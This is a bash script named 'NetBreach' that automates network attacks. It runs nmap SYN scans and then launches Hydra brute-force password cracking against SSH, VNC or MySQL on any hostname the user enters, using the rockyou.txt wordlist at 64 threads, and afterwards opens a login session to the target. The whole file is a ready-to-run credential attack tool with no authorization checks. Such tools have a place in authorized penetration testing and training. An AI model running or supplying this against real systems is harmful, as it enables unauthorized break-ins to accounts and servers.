#!/bin/bash

# Load variables
source DontEdit.sh

# Trap functions for signal handling
handle_exit() {
    echo -e "${RED}[-]${NC} Exiting software..."
    exit 1
}

trap handle_exit SIGINT SIGTSTP

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Check for --help argument
show_help() {
    figlet "? HELP ?"
    echo -e "\n+++++++++++++++ Programs used +++++++++++++++"
    echo "This program helps crack passwords using Hydra and Nmap."
    echo -e "\n+++++++++++++++ How to use +++++++++++++++"
    echo "1. Specify the port you want to scan (e.g., SSH - 22, VNC - 5900, MySQL - 3306)."
    echo "2. The program scans the network and identifies open ports."
    echo "3. Input the username and hostname to attempt cracking the target service."
    exit 0
}

# Function to check and install missing packages
install_missing_packages() {
    for package in "${required_packages[@]}"; do
        if ! command_exists "$package"; then
            echo -e "[ ${RED}FAIL${NC} ] Missing package: ${GREEN}'${package}'${NC}."
            read -p "Would you like to install it? (YES/NO): " install
            if [[ "$install" =~ ^(YES|yes|Y|y)$ ]]; then
                bash requirements.sh || {
                    echo -e "[ ${RED}ERROR${NC} ] Failed to install packages."
                    exit 1
                }
            else
                echo -e "Exiting program. Missing package: ${GREEN}${package}${NC}"
                exit 1
            fi
        fi
    done
}

# Internet connectivity check
check_internet() {
    if ! curl -s --head --fail https://google.com/ > /dev/null; then
        echo -e "[ ${RED}FAIL${NC} ] Internet connection required."
        exit 1
    fi
}

# Main functionality
NetBreach() {
    clear
    figlet -f slant "NetBreach"
    echo "Enter the port to scan (SSH - 22, VNC - 5900, MySQL - 3306). Type 'ALL' to scan all or 'stop' to exit."
    read -p ">>> " service

    case "$service" in
    ALL|all)
        echo -e "${RED}Scanning entire network... This might take a while.${NC}"
        sudo nmap -sS 127.0.0.1 -Pn -oN scan.txt --open
        ;;
    stop)
        echo "Exiting program..."
        exit 0
        ;;
    *)
        if [[ ! "$service" =~ ^[0-9]+$ ]]; then
            echo -e "[ ${RED}ERROR${NC} ] Invalid port number."
            exit 1
        fi
        sudo nmap -sS 127.0.0.1 -p "$service" -oN "${service}.log" --open
        read -p "Open scan results? (YES/NO): " open_scan
        if [[ "$open_scan" =~ ^(YES|yes|Y|y)$ ]]; then
            open "${service}.log"
        fi
        ;;
    esac
}

# Crack service credentials
RunHackingCommand() {
    read -p "Input Username: " user
    read -p "Input Hostname: " host
    read -p "Input Port: " port

    case "$port" in
    22)
        hydra -l "$user" -P rockyou.txt -t 64 -vV -o output.log -I ssh://"$host":"$port"
        ssh "${user}@${host}" -p "${port}"
        ;;
    5900)
        hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://"$host":"$port"
        open "vnc://${host}"
        ;;
    3306)
        hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I mysql://"${host}":"${port}"
        mysql -u "${user}" -p
        ;;
    *)
        echo -e "[ ${RED}ERROR${NC} ] Unsupported port/service."
        ;;
    esac
}

# Main execution flow
if [[ "$1" == "--help" || "$1" == "-h" ]]; then
    show_help
elif [[ "$1" == "--skip" ]]; then
    echo "Skipping package check..."
    NetBreach
else
    install_missing_packages
    check_internet
    NetBreach
    RunHackingCommand
fi
